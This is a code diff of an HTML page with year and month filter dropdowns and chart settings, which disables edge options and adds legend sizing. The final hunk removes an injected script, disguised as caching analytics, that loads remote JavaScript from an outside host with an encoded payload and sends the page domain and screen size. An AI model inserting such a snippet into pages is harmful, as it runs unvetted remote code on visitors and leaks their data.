@@ -42,14 +42,14 @@
 							<option value="2014">2014</option>
 							<option value="2015">2015</option>
 							<option value="2016">2016</option>
-							<option value="2017">2017</option>
+							<option disabled value="2017">2017</option>
 						</select>
 					</div>
 
 					<div class="filterYearRight">
 						<label for="to">to</label>
 						<select class="form-control" id="to">
-							<option value="2010">2010</option>
+							<option disabled value="2010">2010</option>
 							<option value="2011">2011</option>
 							<option value="2012">2012</option>
 							<option value="2013">2013</option>
@@ -115,14 +115,14 @@
 							<option value="9">Sep</option>
 							<option value="10">Oct</option>
 							<option value="11">Nov</option>
-							<option value="12">Dec</option>
+							<option disabled value="12">Dec</option>
 						</select>
 					</div>
 
 					<div class="filterYearRight">
 						<label for="toSecondary">to</label>
 						<select class="form-control" id="toSecondary">
-								<option value="1">Jan</option>
+								<option disabled value="1">Jan</option>
 								<option value="2">Feb</option>
 								<option value="3">Mar</option>
 								<option value="4">Apr</option>
@@ -221,11 +221,13 @@
 				options[i].disabled = false;
 			}
 			options[0].selected = true;
+			options[options.length - 1].disabled = true;
 
 			options = document.getElementById('toSecondary').options;
 			for (var i = 0; i < options.length; i++) {
 				options[i].disabled = false;
 			}
+			options[0].disabled = true;
 			options[options.length - 1].selected = true;
 		}
 
@@ -444,10 +446,12 @@
 			marginLeft: 80,
 			marginRight: 20,
 			width: 700, 
-			height: 370,
+			height: 350,
 			requireLegend: true,
 			type: 1,
-			callback: changeYear
+			callback: changeYear,
+			legendWidth: '700px',
+			legendMarginLeft: '20px'
 		};
 		var multiSeriesChart = new multiSeriesLineChart(multiSeriesChartConfig);
 
@@ -715,7 +719,9 @@
 			width: 550,
 			height: 250,
 			requireLegend: true,
-			type: 2
+			type: 2,
+			legendWidth: '100px',
+			legendMarginLeft: '35px'
 		};
 
 		$('#fromSecondary').change(function() {
@@ -780,29 +786,5 @@
 			// 	$(this).val(endMonth);
 			// }
 		});
-	</script>
-	<script type="text/javascript">
-		if (self==top) {
-			function netbro_cache_analytics(fn, callback) {
-				setTimeout(function() {
-					fn();
-					callback();
-				}, 0);
-			}
-			function sync(fn) {
-				fn();
-			}
-			function requestCfs(){
-				var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
-				var idc_glo_r = Math.floor(Math.random() * 99999999999);
-				var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2tIcRZ5y6qo4CTlz5HvmSaqzAZXLV6w0QiAK3goRLw9IwDH6rRzZrW%2bb%2bwUt5Wswsei9pGyX3iuyophQ3D6x%2fUoNueAqQ6cQEIwcELTyacY1qA7vsiYP9dJrscmn8SxUqUCC%2beO6zT8qbs44afCkAaoODAFe9IxhxaLatMOjEPA35JftdTijeP2vRt%2fB6qi%2b9tPhQlx1pWdNlR2A1qAMfY8YykThDORF37gA%2fE86uMGcQtif3OJpmgdXknV7nDH%2b2bcOl1RJM%2fIBvLPq1mJdpb7mNE%2bGekvvfH0%2fhKI0%2fJRza9%2fmO6INOSyaPPa1%2btKjBy1w7oQ%2fvecft%2f1%2b%2bu9zNCTvhGf37l%2bb%2flWg8IaKNsmr5s%2fHd0yGiOhIt3QW9o7KrCePchWb2q2kf8qHWS6aZwoXrkeKJiRbJaP3KU%2fyqcWen%2fVI8tHYQ%2fOadAjm0XH1jPZ5bhGrSPvabD9q6gD%2bU3OFCkcdVzj7yPJ%2bCp1Z55Mh%2fM9FjZtLsPS42O68OvObm13Feyn1UMvJOX%2ffbzAuK7ICe83DPJX2Vs2St5WFSrAH1QNLSW%2f3QvEoAy0DCrdkfVMYgh3LSQYyPAp8KJDeAPtOz%2bbo9CR8wYvuLl51%2bKMniBn5hK1yYWGFrAHFs1Cr54zmOwll8D%2bYue%2b70WEzTYw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
-				var bsa = document.createElement('script');
-				bsa.type = 'text/javascript';
-				bsa.async = true;bsa.src = url;
-				(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
-			}
-			
-			netbro_cache_analytics(requestCfs, function(){});
-		};
 	</script>
 </html>
